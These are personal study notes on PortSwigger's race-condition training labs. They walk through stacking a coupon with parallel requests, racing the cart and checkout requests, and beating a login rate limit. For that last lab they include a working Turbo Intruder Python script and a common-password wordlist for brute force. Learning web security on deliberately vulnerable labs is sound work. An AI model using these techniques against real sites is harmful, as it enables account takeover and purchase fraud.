---
created: 2026-05-10
---

| `#`  | Solved? | Name                                      | Date    | Notes |
| ---- | ------- | ----------------------------------------- | ------- | ----- |
| `1.` | `✓`     | Limit overrun race conditions             | `10.05` |       |
| `2.` | `✓`     | Bypassing rate limits via race conditions | `10.05` |       |
| `3.` | `✓`     | Multi-endpoint race conditions            | `12.05` |       |
| `4.` |         | Single-endpoint race conditions           |         |       |
| `5.` |         | Exploiting time-sensitive vulnerabilities |         |       |


## 1. Limit overrun race conditions

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: Limit overrun race conditions`](https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun)
> - Level: #Apprentice 
> 
> This lab's purchasing flow contains a race condition that enables you to purchase items for an unintended price.
> 
> To solve the lab, successfully purchase a Lightweight L33t Leather Jacket.
> 
> You can log in to your account with the following credentials: `wiener:peter`.
> 
> For a faster and more convenient way to trigger the race condition, we recommend that you solve this lab using the Trigger race conditions custom action. This is only available in Burp Suite Professional.


### Solution

- On the main page, you see a 20% off promo-code:

![[images/walkthrough/PortSwigger/Race conditions/lab1/1.png]]


- Log in as `wiener`. At the beginning, you have $50 store credits:

![[images/walkthrough/PortSwigger/Race conditions/lab1/2.png]]


1. Add any product you can afford to the cart.
2. Go to the `cart`.
3. Apply a coupon: `PROMO20`:

![[images/walkthrough/PortSwigger/Race conditions/lab1/3.png]]

4. `Place order`.

- Inspect the requests in Burp history:

![[images/walkthrough/PortSwigger/Race conditions/lab1/5.png]]

- If you try to apply the coupon two times, the application responds with `Coupon already applied`:

![[6.png]]

- However, if the feature has a race condition bug, you might be able to apply many coupons at once. 

- Add the `Lightweight "l33t" Leather Jacket` to your cart.
- The send the coupon `POST` request you used previously to `Repeater`. Add the tab to a new group, duplicate it `30` times, and `Send group in parallel (single-packet attack)`:

![[images/walkthrough/PortSwigger/Race conditions/lab1/7.png]]

- Then click `Send group (parallel)`.

- See that the coupon has been applied many times. You can now buy the jacket for just $19 instead of $1337:

![[images/walkthrough/PortSwigger/Race conditions/lab1/8.png]]

- `Place order`.

![[images/walkthrough/PortSwigger/Race conditions/lab1/solved.png]]

Solved!
## 2. Bypassing rate limits via race conditions

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: Bypassing rate limits via race conditions`](https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits)
> 
> - Level: #Practitioner 
> 
> This lab's login mechanism uses rate limiting to defend against brute-force attacks. However, this can be bypassed due to a race condition.
> 
> To solve the lab:
> 
> 1. Work out how to exploit the race condition to bypass the rate limit.
> 2. Successfully brute-force the password for the user `carlos`.
> 3. Log in and access the admin panel.
> 4. Delete the user `carlos`.
> 5. You can log in to your account with the following credentials: `wiener:peter`.
> 
> You should use the following list of potential passwords:
> 
> ```
> 123123
> abc123
> football
> monkey
> letmein
> shadow
> master
> 666666
> qwertyuiop
> 123321
> mustang
> 123456
> password
> 12345678
> qwerty
> 123456789
> 12345
> 1234
> 111111
> 1234567
> dragon
> 1234567890
> michael
> x654321
> superman
> 1qaz2wsx
> baseball
> 7777777
> 121212
> 000000
> ```                
>>[!note]
>>- Solving this lab requires Burp Suite 2023.9 or higher. You should also use the latest version of the Turbo Intruder, which is available from the BApp Store.
>>- You have a time limit of 15 mins. If you don't solve the lab within the time limit, you can reset the lab. However, Carlos's password changes each time.
### Solution

- Try several incorrect passwords for your account. After 4 incorrect attempts, you see a rate-limiting timer:

![[images/walkthrough/PortSwigger/Race conditions/lab2/1.png]]

- It may be possible to bypass the timer using race conditions:

1. Right-click the login request -> `Extensions` -> `Turbo Intruder` -> `Send to turbo intruder`:

![[images/walkthrough/PortSwigger/Race conditions/lab2/2.png]]

2. You will see a window with the request. Change `carlos` to `wiener` and set the `%s` payload placeholder for the password:

![[images/walkthrough/PortSwigger/Race conditions/lab2/3.png]]

3. Paste the following to the code section:

```Python
def queueRequests(target, wordlists):

    # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )
    
    # assign the list of candidate passwords from your clipboard
    passwords = wordlists.clipboard
    
    # queue a login request using each password from the wordlist
    # the 'gate' argument withholds the final part of each request until engine.openGate() is invoked
    for password in passwords:
        engine.queue(target.req, password, gate='1')
    
    # once every request has been queued
    # invoke engine.openGate() to send all requests in the given gate simultaneously
    engine.openGate('1')


def handleResponse(req, interesting):
    table.add(req)
```

![[images/walkthrough/PortSwigger/Race conditions/lab2/4.png]]

4. Copy the password list to clipboard:

```
123123
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
123321
mustang
123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
1234567890
michael
x654321
superman
1qaz2wsx
baseball
7777777
121212
000000
```

5. Click `Attack`.
6. In the results, find a `302` response:

![[images/walkthrough/PortSwigger/Race conditions/lab2/5.png]]

- Use the discovered credentials to log in as `carlos`:

![[images/walkthrough/PortSwigger/Race conditions/lab2/6.png]]

- Access `Admin panel`:

![[images/walkthrough/PortSwigger/Race conditions/lab2/7.png]]

- Delete user `carlos`:

![[images/walkthrough/PortSwigger/Race conditions/lab2/solved.png]]
## 3. Multi-endpoint race conditions

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: Multi-endpoint race conditions`](https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint)
> - Level: #Practitioner 
> 
> This lab's purchasing flow contains a race condition that enables you to purchase items for an unintended price.
> 
> To solve the lab, successfully purchase a **Lightweight L33t Leather Jacket**.
> 
> You can log into your account with the following credentials: `wiener:peter`.
>>[!tip]+ When experimenting, we recommend purchasing the gift card as you can later redeem this to avoid running out of store credit.

### Solution

First, walk through the functionality the application offers and what you can do:

1. Log in as `wiener`. Initially, you have `$100` store credits.

![[images/walkthrough/PortSwigger/Race conditions/lab3/1.png]]

2. Go to the lab home, then navigate to `Gift Card`. Click `Add to cart`.
3. Go to your cart.

![[images/walkthrough/PortSwigger/Race conditions/lab3/2.png]]

4. Then `Place order`.

![[images/walkthrough/PortSwigger/Race conditions/lab3/3.png]]

5. Redeem the gift card:

![[images/walkthrough/PortSwigger/Race conditions/lab3/4.png]]

- Analyze the flow in Burp history:

![[images/walkthrough/PortSwigger/Race conditions/lab3/5.png]]

- The lab description says that the vulnerability allows you to purchase items for an unintended price. So attempting to apply the same gift card multiple times as we did with coupons is not what this lab is about (yes, I tried and failed).

- Add `Gift Card` to your cart again, and navigate to the `cart` endpoint without the `session` cookie:

![[images/walkthrough/PortSwigger/Race conditions/lab3/6.png]]

- Nothing is in the cart, which means the cart content is tied to each account separately. 

- So, each of these actions — adding items to the cart, removing them, checking out — likely operate on the same cart resource. The goal is two operations that modify this shared resource and attempt to cause a collision by submitting them withing a short race window.

- Analyze the purchasing workflow:
	1. The cart is empty. 
	2. `POST /cart` adds a product with the given ID to the cart. This increases the total price of the cart.
	3. `POST /cart/checkout` withdraws credits equal to cart price from your balance. This reduces the total price of the cart and reduces your balance. 

- Two endpoints, two operations:
	- `/cart`
	- `/cart/checkout`
- States:
	- State 1: `/cart` -> price `n`, balance `b`
	- State 2: Another `/cart` -> price `n + m`, balance `b`
	- State 3: `/cart/checkout` -> price `0`, balance `b - (n + m)`
- Workflow:
	1. `/cart` -> the application checks the price of the product and increases your cart price.
	2. Another `/cart` ) -> he application checks the price of the product and increases your cart price once again.
	3. `/cart/checkout`:
		1. The application takes the price of the cart and checks your balance is greater than this value.
		2. The application approves the checkout — removes products from the cart, reduces the cart price to `0`, and withdraws credits from your balance.

- Where is the gap? Between adding another product and the checkout. 

Workflow:

1. Make sure you have only `Gift Card` in your cart.
2. Add `/cart` to `Repeater` and change product ID to `1`.
3. Add `/cart/checkout` to `Repeater`.
4. Add both requests to one tab group.
5. Send the group in parallel.


![[images/walkthrough/PortSwigger/Race conditions/lab3/7.png]]

![[images/walkthrough/PortSwigger/Race conditions/lab3/8.png]]

![[images/walkthrough/PortSwigger/Race conditions/lab3/solved.png]]

Solved!

## 4. Single-endpoint race conditions


>[!note]+ Lab description

- [`Lab: Single-endpoint race conditions`](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint)
- Level: #Practitioner 


## 5. Exploiting time-sensitive vulnerabilities


>[!note]+ Lab description

- [`Lab: Exploiting time-sensitive vulnerabilities`](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities)
- Level: #Practitioner 

